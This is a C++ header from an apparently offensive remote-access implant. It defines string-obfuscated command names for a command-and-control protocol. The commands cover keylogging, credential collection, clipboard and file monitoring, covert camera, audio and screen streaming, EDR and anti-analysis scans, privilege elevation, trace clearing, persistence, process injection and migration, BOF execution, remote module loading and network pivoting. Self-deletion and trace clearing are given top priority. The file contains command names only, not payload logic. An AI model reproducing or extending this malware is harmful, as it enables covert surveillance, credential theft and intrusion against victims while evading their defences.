#pragma once
#include "Common/Obfuscation/StringObf.hpp"

// 辅助宏：定义混淆命令名（返回 const char*）
#define DEF_CMD(name, value) \
    inline const char* name() { \
        static const std::string s = OBF_STR(value); \
        return s.c_str(); \
    }

namespace Priority {
	// 0-4，数值越小越优先执行
	static constexpr uint8_t Survival = 0;      // 保命/反取证：SelfDelete, ClearTraces, Disconnect
	static constexpr uint8_t Preparation = 1;   // 准备/提权/撤离：ElevateSelf, SetConfig, ExitProgram
	static constexpr uint8_t Discovery = 2;     // 侦察/枚举：EnumProcess, EnumService, FileListDir
	static constexpr uint8_t HeavyIO = 3;       // 重量级I/O：ScreenShot, CameraCapture, FileDownload, FileUpload
	static constexpr uint8_t Finalization = 4;  // 收尾/关机：ShutdownPC, RebootPC
}

namespace Cmd {

	namespace Heartbeat {
		DEF_CMD(Ping, "HeartbeatPing")
			DEF_CMD(Pong, "HeartbeatPong")
	}

	namespace Poll {
		DEF_CMD(Pull, "Poll") // A→S: 拉取命令队列(混合结构 pull 通道)
	}

	namespace Runtime {
		DEF_CMD(SetWorkerTimeout, "SetWorkerTimeout") // 配置命令执行超时(毫秒)
			DEF_CMD(SetConfig, "SetConfig")             // 通用配置下发(profile 调参)
			DEF_CMD(GetConfig, "GetConfig")             // 配置回读(当前生效全量, 供面板回显/diff)
			DEF_CMD(AgentDescribe, "AgentDescribe")     // 机器可读自述: 版本/构建标识 + 活注册命令清单 + 已加载模块
			DEF_CMD(SleepMaskProbe, "SleepMaskProbe") // 睡眠掩码自检(dry-run=普查+原语+RC4 往返; execute=真窗口; 仅 CLEAT_WITH_MASK 构建;  由 SleepMaskTest 更名)
	}

	// 任务系统命令面 —— 与生存命令同档注册, 不随功能裁剪
	namespace Job {
		DEF_CMD(List, "JobList")       // 全量任务快照 + 名册对账差集(roster_mismatch)
			DEF_CMD(Status, "JobStatus") // 单任务详情(按 id 或 name)
			DEF_CMD(Kill, "JobKill")     // 受理停止请求(协作式; 按 id 或 name)
	}

	DEF_CMD(FirstConnect, "FirstConnect")

		namespace Clipboard {
		DEF_CMD(Get, "ClipboardGet") // read clipboard (text+files)
			DEF_CMD(Set, "ClipboardSet") // write clipboard text
			DEF_CMD(Data, "ClipboardData") // A->S: monitor hit push
	}

	namespace EdrRecon {
		DEF_CMD(Scan, "EdrScan") // EDR/AV 产品与内核驱动侦察
	}

	namespace ClipboardMonitor {
		DEF_CMD(Start, "ClipboardMonitorStart") // start monitor
			DEF_CMD(Stop, "ClipboardMonitorStop") // stop monitor
	}

	namespace FileMonitor {
		DEF_CMD(Start, "FileMonitorStart") // start monitor
			DEF_CMD(Stop, "FileMonitorStop") // stop monitor
			DEF_CMD(Data, "FileChangeData") // A->S: file change push
	}

	namespace ScreenShot {
		DEF_CMD(SingleShot, "ScreenShotSingleShot")
	}

	namespace ProcessManager {
		DEF_CMD(Enum, "EnumProcess")
			DEF_CMD(Kill, "KillProcess")
			DEF_CMD(Suspend, "SuspendProcess")
			DEF_CMD(Resume, "ResumeProcess")
	}

	namespace ServiceManager {
		DEF_CMD(Enum, "EnumService")
			DEF_CMD(Stop, "StopService")
			DEF_CMD(Start, "StartService")
	}

	namespace DriverManager {
		DEF_CMD(Enum, "EnumDriver")
			DEF_CMD(Stop, "StopDriver")
			DEF_CMD(Start, "StartDriver")
	}

	namespace SoftwareManager {
		DEF_CMD(Enum, "EnumSoftware")
	}

	namespace WindowManager {
		DEF_CMD(Enum, "EnumWindow")
			DEF_CMD(Close, "CloseWindow")      // 关闭窗口
			DEF_CMD(SetTopMost, "SetTopMostWindow") // 置顶窗口
			DEF_CMD(RemoveTopMost, "RemoveTopMostWindow") // 取消置顶
	}

	namespace PcManager {
		DEF_CMD(Shutdown, "ShutdownPC")
			DEF_CMD(Reboot, "RebootPC")
			DEF_CMD(Logout, "LogoutPC")
			DEF_CMD(Lock, "LockPC")
	}

	namespace RemoteInput {
		DEF_CMD(MouseEvent, "RemoteInputMouseEvent")
			DEF_CMD(KeyboardEvent, "RemoteInputKeyboardEvent")
			DEF_CMD(CharEvent, "RemoteInputCharEvent")
			DEF_CMD(LockInput, "RemoteInputLock")
			DEF_CMD(UnlockInput, "RemoteInputUnlock")
	}

	namespace Terminal {
		DEF_CMD(Start, "TerminalStart")
			DEF_CMD(Output, "TerminalOutput")
			DEF_CMD(Close, "TerminalClose")
			DEF_CMD(Input, "TerminalInput")
	}

	namespace FileManager {
		DEF_CMD(GetDrives, "FileGetDrives")
			DEF_CMD(ListDir, "FileListDir")
			DEF_CMD(DeleteFile, "FileDelete")
			DEF_CMD(CreateDir, "FileCreateDir")
			DEF_CMD(MoveFile, "FileMove")
			DEF_CMD(CopyFile, "FileCopy")
			DEF_CMD(Chmod, "FileChmod")
			DEF_CMD(DownloadReq, "FileDownloadReq")
			DEF_CMD(DownloadData, "FileDownloadData")
			DEF_CMD(DownloadComplete, "FileDownloadComplete")
			DEF_CMD(DownloadError, "FileDownloadError")
			DEF_CMD(UploadReq, "FileUploadReq")
			DEF_CMD(UploadData, "FileUploadData")
			DEF_CMD(UploadComplete, "FileUploadComplete")
			DEF_CMD(UploadError, "FileUploadError")
	}

	namespace NetworkManager {
		DEF_CMD(Enum, "EnumNetwork")
	}

	DEF_CMD(GetSystemInfo, "GetSystemInfo")

		namespace Telemetry {
		DEF_CMD(EventReport, "EventReport") // A→S: log/event report (WARN+)
	}

	namespace Keylog {
		DEF_CMD(Start, "KeylogStart")
			DEF_CMD(Stop, "KeylogStop")
			DEF_CMD(Data, "KeylogData")
	}

	namespace PrivacyScreen {
		DEF_CMD(Start, "PrivacyScreenStart")
			DEF_CMD(Stop, "PrivacyScreenStop")
	}

	namespace RegistryManager {
		DEF_CMD(EnumKey, "RegistryEnumKey")      // 枚举指定路径下的子键和值
			DEF_CMD(GetValue, "RegistryGetValue")
	}

	namespace Audio {
		DEF_CMD(StartRecord, "AudioStartRecord")   // 开始录音
			DEF_CMD(StopRecord, "AudioStopRecord")    // 停止录音
			DEF_CMD(AudioData, "AudioData")     // 音频数据包
	}

	namespace Camera {
		DEF_CMD(Capture, "CameraCapture")
			DEF_CMD(Stop, "CameraStop")
	}

	namespace CameraStream {
		DEF_CMD(Start, "CameraStreamStart")
			DEF_CMD(Stop, "CameraStreamStop")
			DEF_CMD(Data, "CameraStreamData")   // 帧上报统一命令
	}

	namespace DesktopStream {
		DEF_CMD(Start, "DesktopStreamStart")
			DEF_CMD(Stop, "DesktopStreamStop")
			DEF_CMD(Data, "DesktopStreamData")  // 上报命令
	}

	namespace System {
		DEF_CMD(SetMonitorPower, "SystemSetMonitorPower")  // 设置显示器电源状态
	}

	namespace Offensive {
		DEF_CMD(ApplyAntiConfig, "ApplyAntiConfig")  // 应用对抗配置
			DEF_CMD(CredentialCollect, "CredentialCollect") // S→A: 触发凭据采集
			DEF_CMD(CredentialData, "CredentialData")     // A→S: 凭据数据推送
			DEF_CMD(AntiAnalysisScan, "AntiAnalysisScan")   // S→A: 触发反分析检测
			DEF_CMD(AntiAnalysisReport, "AntiAnalysisReport") // A→S: 检测结果推送
			DEF_CMD(Elevate, "Elevate")             // S→A: 触发提权(指定方法+目标程序)
			DEF_CMD(ElevationReport, "ElevationReport") // A→S: 提权结果推送
			DEF_CMD(Discovery, "Discovery")         // S→A: 触发域环境枚举
			DEF_CMD(DiscoveryReport, "DiscoveryReport") // A→S: 枚举结果推送
			DEF_CMD(ClearTraces, "ClearTraces")     // S→A: 痕迹清理(T1070, 事件日志/Recent/Prefetch)
			// 新增
			DEF_CMD(PersistenceApply, "PersistenceApply")
			DEF_CMD(PersistenceRemove, "PersistenceRemove") // S→A: 卸载持久化(幂等)
			DEF_CMD(PersistenceReport, "PersistenceReport")
	}

	namespace Pivot {
		DEF_CMD(Start, "PivotStart")   // S→A: 建立到内网目标的新连接
			DEF_CMD(Data, "PivotData")    // 双向: 代理数据(混合帧, 原始 TCP 字节)
			DEF_CMD(Close, "PivotClose")  // 双向: 关闭指定 pivot 连接
			DEF_CMD(Listen, "PivotListen") // S→A: 在多跳入口监听端口(启动 SOCKS5 入口)
			DEF_CMD(RportfwdAdd, "PivotRportfwdAdd")   // S→A: 反向端口转发监听(Agent 监听→流量送 Server)
			DEF_CMD(RportfwdDel, "PivotRportfwdDel")   // S→A: 停止反向端口转发监听
			DEF_CMD(Opened, "PivotOpened")             // A→S: rportfwd 入站连接已接受(虚拟连接开通通告)
			DEF_CMD(ListenPipe, "PivotListenPipe")     // S→A: 开会话借道入口(pipe_name + 配对密钥, L3)
			DEF_CMD(PipeStop, "PivotPipeStop")         // S→A: 关会话借道入口
	}

	namespace Error {
		DEF_CMD(GenericError, "ErrorGeneric")  // 统一错误响应
	}

	DEF_CMD(ExitProgram, "ExitProgram")

	namespace Migrate {
		DEF_CMD(Spawn, "MigrateSpawn") // S→A: 注入 shc 到牺牲进程并接管会话(帧二进制体 = shc)
	}

	namespace Bof {
		DEF_CMD(Exec, "BofExec") // S→A: 执行 BOF(帧二进制体 = COFF; params: entry/args_b64/timeout_ms)
	}

	namespace Inject {
		DEF_CMD(Exec, "InjectExec") // S→A: 注入载荷(帧二进制体 = blob, 第 0 字节 = 入口; params: method/target_kind/target/payload_kind)
	}


		// 远程模块(阶段 C, ): 模块字节随 Load 帧二进制体单帧下发
		namespace Module {
		DEF_CMD(Load, "ModuleLoad")      // S→A: 下发并加载模块(binary = 模块字节)
			DEF_CMD(Unload, "ModuleUnload")  // S→A: 卸载模块
			DEF_CMD(Status, "ModuleStatus")  // S→A: 查询模块状态(A 回 ModuleStatusReport)
			DEF_CMD(StatusReport, "ModuleStatusReport") // A→S: 模块状态上报
	}

} // namespace Cmd